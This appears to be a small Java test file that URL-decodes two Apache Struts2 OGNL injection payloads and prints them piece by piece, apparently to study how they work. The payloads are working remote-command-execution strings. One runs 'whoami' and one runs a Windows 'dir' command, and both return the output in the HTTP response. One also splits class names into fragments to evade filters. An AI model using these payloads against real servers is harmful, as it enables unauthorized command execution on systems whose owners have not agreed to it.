package com.test.app;

import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;

public class Test {

	public static void main(String[] args) {
		
		test1();
		
		System.out.println("\\AAAA");
		
		
	}
	
	
	public static void test2(){
		
		String str = "redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}";
		
		System.out.println("原始的代码片段-- >" + str);
		
		try {
			String result = URLDecoder.decode(str,"utf-8");
			System.out.println("decode后-->" + result);
			
			String[] a  = result.split(",");
			System.out.println("split(\",\")后-->");
			
			for(int i= 0 ;i < a.length; i++){
				if(i != a.length-1){
					System.out.println(a[i]+",");
				}else{
					System.out.println(a[i]);
				}
			}
			
			
		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	
	public static void test1(){
		String str =  "redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27cmd /c dir d:\\%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}";
		
		System.out.println("原始的代码片段-- >" + str);
		
		try {
			String result = URLDecoder.decode(str,"utf-8");
			System.out.println("decode后-->" + result);
			
			String[] a  = result.split(",");
			System.out.println("split(\",\")后-->");
			
			for(int i= 0 ;i < a.length; i++){
				if(i != a.length-1){
					System.out.println(a[i]+",");
				}else{
					System.out.println(a[i]);
				}
			}
			
			
		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	
}
